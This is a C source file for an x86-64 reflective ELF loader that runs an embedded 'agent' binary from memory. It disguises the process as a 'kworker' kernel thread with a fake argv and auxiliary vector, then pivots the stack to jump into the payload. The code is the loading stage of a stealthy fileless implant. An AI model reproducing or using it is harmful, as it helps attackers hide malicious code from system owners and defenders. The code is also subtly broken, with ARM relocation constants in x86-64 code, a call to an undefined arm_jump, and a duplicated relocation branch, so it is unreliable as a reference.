#include <elf.h>
#include <sys/mman.h>
#include <stdint.h>

#include "agent.h"
#include "functions-x86-64.h"

#define ElfN_Ehdr Elf64_Ehdr
#define ElfN_Phdr Elf64_Phdr
#define ElfN_Shdr Elf64_Shdr
#define ElfN_Sym  Elf64_Sym
#define ElfN_Rela Elf64_Rela
#define ElfN_Addr Elf64_Addr
#define ElfN_Word Elf64_Word
#define ElfN_Sxword Elf64_Sxword
#define ElfN_Xword Elf64_Xword
#define ElfN_Off  Elf64_Off
#define ElfN_Dyn  Elf64_Dyn
#define MAX_SEGMENTS 16
#define PAGESIZE 4096

typedef struct elf_info {
    void* entry_point;
    ElfN_Addr pie_base;
    ElfN_Ehdr* hdr;
} elf_info;

typedef struct load_segment {
    ElfN_Addr  vaddr;
    ElfN_Xword memsz;
    ElfN_Xword filesz;
    ElfN_Off   offset;
    ElfN_Word  flags;
    ElfN_Xword align;
} load_segment;

static int prot_from_pflags(ElfN_Word flags) {
    int prot = 0;
    if (flags & PF_R) prot |= PROT_READ;
    if (flags & PF_W) prot |= PROT_WRITE;
    if (flags & PF_X) prot |= PROT_EXEC;
    return prot;
}

static int apply_segment_protections_union(void *mapping, size_t mapsz, ElfN_Addr pie_base, load_segment *segs, int seg_count, int allow_wx) {
    size_t page_size = (size_t)PAGESIZE;
    size_t page_count = (mapsz + page_size - 1) / page_size;

    uint8_t *page_prot = sys_mmap(NULL, page_count, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if ((long)page_prot < 0) return -1;

    sys_memset(page_prot, 0, page_count);

    for (int i = 0; i < seg_count; i++) {
        load_segment *seg = &segs[i];

        ElfN_Addr seg_start = pie_base + seg->vaddr;
        ElfN_Addr seg_end   = seg_start + seg->memsz;

        ElfN_Addr map_start = (ElfN_Addr)mapping;
        ElfN_Addr map_end   = map_start + mapsz;

        if (seg_end <= map_start || seg_start >= map_end) continue;
        if (seg_start < map_start) seg_start = map_start;
        if (seg_end   > map_end)   seg_end   = map_end;

        size_t p0 = (size_t)((seg_start - map_start) / page_size); 
        size_t p1 = (size_t)((seg_end   - map_start + page_size - 1) / page_size); 

        int prot = prot_from_pflags(seg->flags);
        
        for (size_t p = p0; p < p1 && p < page_count; p++) {
            if (allow_wx && (prot & PROT_EXEC)) prot |= PROT_WRITE;
            page_prot[p] |= (uint8_t)prot;
        }
    }

    for (size_t p = 0; p < page_count; ) {
        int prot = page_prot[p];
        if (prot == 0) prot = PROT_READ; 

        size_t run = 1;
        while (p + run < page_count) {  
            int next = page_prot[p + run];
            if (next == 0) next = PROT_READ;
            if (next != prot) break;
            run++;
        }

        void *addr = (char *)mapping + p * page_size;
        size_t len = run * page_size;

        if (sys_mprotect(addr, len, prot) != 0) {  
            sys_munmap(page_prot, page_count);
            return 0;
        }

        p += run;
    }

    sys_munmap(page_prot, page_count);
    return 1;
}

int is_image_valid(struct elf_info *info) {
    if (memcmp(info->hdr->e_ident, ELFMAG, SELFMAG) != 0) {
        return 0;
    }
    if (info->hdr->e_ident[EI_CLASS] != ELFCLASS64) {
        return 0;
    }
    if (info->hdr->e_machine != EM_X86_64) { 
        return 0; 
    }
    if (info->hdr->e_type != ET_DYN) {
        return 0;
    }
    if (info->hdr->e_phnum <= 0) {
        return 0;
    }
    return 1;
}

__attribute__((noreturn))
void amd_jump(ElfN_Addr sp, void *entry) {
    asm volatile(
        "mov %0, %%rsp\n"
        "xor %%rbp, %%rbp\n"
        "xor %%rdi, %%rdi\n"
        "xor %%rsi, %%rsi\n"
        "xor %%rdx, %%rdx\n"
        "jmp *%1\n"
        :
        : "r"(sp), "r"(entry)
        : "memory", "rdi", "rsi", "rdx"
    );
    __builtin_unreachable();
}


static size_t cstr_len(const char *s) {
    return s ? (sys_strlen(s) + 1) : 0;
}

static char *stack_copy_str(char **str_top, const char *src) {
    size_t n = cstr_len(src);
    if (n == 0) return NULL;
    *str_top -= n;
    sys_memcpy(*str_top, src, n);
    return *str_top;
}

int load_image(char *elf_start, struct elf_info *info, struct load_segment *load) {
    load_segment segments[MAX_SEGMENTS];
    
    // 1. Setup Fake Environment directly
    int argc = 1;
    char *argv[] = { "kworker", NULL };
    char *envp[] = { NULL };
    int envc = 0;

    info->hdr = (ElfN_Ehdr *)elf_start;
    if (!is_image_valid(info)) return 0;

    ElfN_Phdr *phdr = (ElfN_Phdr *)(elf_start + info->hdr->e_phoff);
    ElfN_Addr min_vaddr = UINT64_MAX;
    ElfN_Addr max_vaddr = 0;
    int seg_count = 0;
    ElfN_Phdr *tls_phdr = NULL;
    int stack_prot = PROT_READ | PROT_WRITE;
    ElfN_Addr dyn_vaddr = 0;

    for (int i = 0; i < info->hdr->e_phnum; i++) {
        switch (phdr[i].p_type) {
            case PT_LOAD:
                if (seg_count >= MAX_SEGMENTS) return 0;
                segments[seg_count++] = (load_segment) {
                    .vaddr  = phdr[i].p_vaddr, .memsz  = phdr[i].p_memsz,
                    .filesz = phdr[i].p_filesz, .offset = phdr[i].p_offset,
                    .flags  = phdr[i].p_flags, .align  = phdr[i].p_align
                };
                if (phdr[i].p_vaddr < min_vaddr) min_vaddr = phdr[i].p_vaddr;
                if ((phdr[i].p_vaddr + phdr[i].p_memsz) > max_vaddr) max_vaddr = phdr[i].p_vaddr + phdr[i].p_memsz;
                break;
            case PT_TLS: tls_phdr = &phdr[i]; break;
            case PT_GNU_STACK:
                stack_prot = 0;
                if (phdr[i].p_flags & PF_R) stack_prot |= PROT_READ;
                if (phdr[i].p_flags & PF_W) stack_prot |= PROT_WRITE;
                if (phdr[i].p_flags & PF_X) stack_prot |= PROT_EXEC;
                break;
            case PT_DYNAMIC: dyn_vaddr = phdr[i].p_vaddr; break;
        }
    }

    load->memsz = max_vaddr - min_vaddr;
    size_t page_size = (size_t)PAGESIZE;
    size_t max_align = page_size;
    for (int i = 0; i < seg_count; i++) {
        if (segments[i].align && segments[i].align > max_align) max_align = segments[i].align;
    }

    size_t alloc_sz = load->memsz + max_align;
    char *mapping_raw = sys_mmap(NULL, alloc_sz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ((long)mapping_raw < 0) return -1;

    char *mapping = (char *)(((uintptr_t)mapping_raw + (max_align - 1)) & ~(uintptr_t)(max_align - 1));
    info->pie_base = (ElfN_Addr)mapping - (ElfN_Addr)min_vaddr;

    for (int i = 0; i < seg_count; i++) {
        void *dst = (void *)(info->pie_base + segments[i].vaddr); 
        void *src = (void *)(elf_start + segments[i].offset);
        sys_memcpy(dst, src, segments[i].filesz);
        if (segments[i].memsz > segments[i].filesz) {
            sys_memset(dst + segments[i].filesz, 0, segments[i].memsz - segments[i].filesz); 
        }
    }

    ElfN_Rela *rela_dyn = NULL; size_t rela_dyn_count = 0;
    ElfN_Rela *rela_plt = NULL; size_t rela_plt_count = 0;
    ElfN_Sxword plt_is_rela = 1;

    if (dyn_vaddr != 0) {
        ElfN_Dyn *dyn = (ElfN_Dyn *)(info->pie_base + dyn_vaddr);
        for (ElfN_Dyn *d = dyn; d->d_tag != DT_NULL; d++) {
            if (d->d_tag == DT_RELA) rela_dyn = (ElfN_Rela *)(info->pie_base + d->d_un.d_ptr);
            else if (d->d_tag == DT_RELASZ) rela_dyn_count = d->d_un.d_val / sizeof(ElfN_Rela);
            else if (d->d_tag == DT_JMPREL) rela_plt = (ElfN_Rela *)(info->pie_base + d->d_un.d_ptr);
            else if (d->d_tag == DT_PLTRELSZ) rela_plt_count = d->d_un.d_val / sizeof(ElfN_Rela);
            else if (d->d_tag == DT_PLTREL) plt_is_rela = d->d_un.d_val;
        }
    }
    
    if (rela_dyn) {
        for (size_t i = 0; i < rela_dyn_count; i++) {
            ElfN_Xword type = ELF64_R_TYPE(rela_dyn[i].r_info);
            ElfN_Addr *where = (ElfN_Addr *)(info->pie_base + rela_dyn[i].r_offset);
            if (type == R_AARCH64_RELATIVE) *where = info->pie_base + rela_dyn[i].r_addend;
        }
    }
    
    if (tls_phdr) {
        size_t tls_size  = tls_phdr->p_memsz;
        size_t tls_align = tls_phdr->p_align ? tls_phdr->p_align : 16;
        size_t tls_area = (tls_size + tls_align - 1) & ~(tls_align - 1);
        size_t neg_tls = 0x80;
        size_t tcb_size = 0x100;  // minimal fake pthread
        size_t total = tcb_size + tls_area;
        uint8_t *block = sys_mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (block == MAP_FAILED) return -1;
        void *tcb = block + neg_tls;
        void *tls_block = block + tcb_size;
        sys_memset(block, 0, neg_tls);        // Copy TLS
        sys_memcpy(tls_block, (void *)(info->pie_base + tls_phdr->p_vaddr), tls_phdr->p_filesz);
        sys_memset((uint8_t *)tls_block + tls_phdr->p_filesz, 0, tls_phdr->p_memsz - tls_phdr->p_filesz);
        *(void **)tcb = tcb;
        syscall(SYS_arch_prctl, ARCH_SET_FS, tcb);
    }

    if (!apply_segment_protections_union(mapping, load->memsz, info->pie_base, segments, seg_count, 1)) return 0;

    if (rela_dyn) {
        for (size_t i = 0; i < rela_dyn_count; i++) {
            if (ELF64_R_TYPE(rela_dyn[i].r_info) != R_AARCH64_IRELATIVE) continue;
            ElfN_Addr *where = (ElfN_Addr *)(info->pie_base + rela_dyn[i].r_offset);
            ElfN_Addr (*resolver)(void) = (ElfN_Addr (*)(void))(info->pie_base + rela_dyn[i].r_addend);
            *where = resolver();
        }
    }

    if (rela_plt && plt_is_rela == DT_RELA) {
        for (size_t i = 0; i < rela_plt_count; i++) {
            ElfN_Xword type = ELF64_R_TYPE(rela_plt[i].r_info);
            ElfN_Addr *where = (ElfN_Addr *)(info->pie_base + rela_plt[i].r_offset);
            if (type == R_X86_64_IRELATIVE) {
                ElfN_Addr (*resolver)(void) = (ElfN_Addr (*)(void))(info->pie_base + rela_plt[i].r_addend);
                *where = resolver();
            } else if (type == R_X86_64_IRELATIVE) {
                *where = info->pie_base + rela_plt[i].r_addend;
            }
        }
    }

    apply_segment_protections_union(mapping, load->memsz, info->pie_base, segments, seg_count, 0);

    info->entry_point = (void*)(info->pie_base + info->hdr->e_entry);

    // build new stack with fake argv/envp/auxv
    size_t stack_size = 3 * 1024 * 1024;
    char *stack = sys_mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ((long)stack < 0) return 0;

    ElfN_Addr new_auxv[256];
    int auxc = 0;
    #define AUX_PUSH(k,v) do { new_auxv[auxc++] = (ElfN_Addr)(k); new_auxv[auxc++] = (ElfN_Addr)(v); } while (0)

    AUX_PUSH(AT_PHDR,   info->pie_base + info->hdr->e_phoff);
    AUX_PUSH(AT_PHENT,  info->hdr->e_phentsize);
    AUX_PUSH(AT_PHNUM,  info->hdr->e_phnum);
    AUX_PUSH(AT_PAGESZ, PAGESIZE);
    AUX_PUSH(AT_ENTRY,  (ElfN_Addr)info->entry_point);
    AUX_PUSH(AT_BASE,   0); 
    AUX_PUSH(AT_SECURE, 0); 
    AUX_PUSH(AT_UID,    1000); 
    AUX_PUSH(AT_EUID,   1000);
    AUX_PUSH(AT_GID,    1000);
    AUX_PUSH(AT_EGID,   1000);

    size_t ptr_words = 1 + argc + 1 + envc + 1 + auxc + 6; // 6 for AT_RANDOM, AT_EXECFN, AT_NULL
    size_t ptr_bytes = (ptr_words * sizeof(ElfN_Addr) + 15) & ~15; 

    char *ptr_base_p = (char *)(((uintptr_t)(stack + stack_size) - ptr_bytes) & ~0xFULL);
    char *str_top = ptr_base_p;

    void *scratch = sys_mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    char **new_argv = (char **)scratch;
    for (int i = 0; i < argc; i++) new_argv[i] = stack_copy_str(&str_top, argv[i]);
    new_argv[argc] = NULL;

    char **new_envp = (char **)((char *)scratch + 0x2000);
    new_envp[0] = NULL;

    char *new_execfn = stack_copy_str(&str_top, argv[0]);

    str_top = (char *)((uintptr_t)str_top & ~0xFULL);
    uint8_t *randbuf = (uint8_t *)(str_top - 16);

    sys_memset(randbuf, 0x41, 16); 

    AUX_PUSH(AT_RANDOM, (ElfN_Addr)randbuf);
    AUX_PUSH(AT_EXECFN, (ElfN_Addr)new_execfn);
    AUX_PUSH(AT_NULL, 0);

    ElfN_Addr *out = (ElfN_Addr *)ptr_base_p;
    *out++ = (ElfN_Addr)argc;
    for (int i = 0; i < argc; i++) *out++ = (ElfN_Addr)new_argv[i];
    *out++ = 0;
    for (int i = 0; i < envc; i++) *out++ = (ElfN_Addr)new_envp[i];
    *out++ = 0;
    sys_memcpy(out, new_auxv, auxc * sizeof(ElfN_Addr));

    sys_mprotect(stack, stack_size, PROT_READ | PROT_WRITE);

    // Pivot stack and jump
    arm_jump((ElfN_Addr)ptr_base_p, info->entry_point);
    return 1;
}

__asm__ (
    ".section .text.entry\n"
    ".global _start\n"
    "_start:\n"
    "call main_loader\n"
    "int3\n" // Trap if main_loader returns unexpectedly
);

__attribute__((used))
int main_loader(void) {
    struct elf_info info;
    struct load_segment load;

    sys_memset(&info, 0, sizeof(info));
    sys_memset(&load, 0, sizeof(load));

    load_image((char *)agent, &info, &load);

    return 0;
}
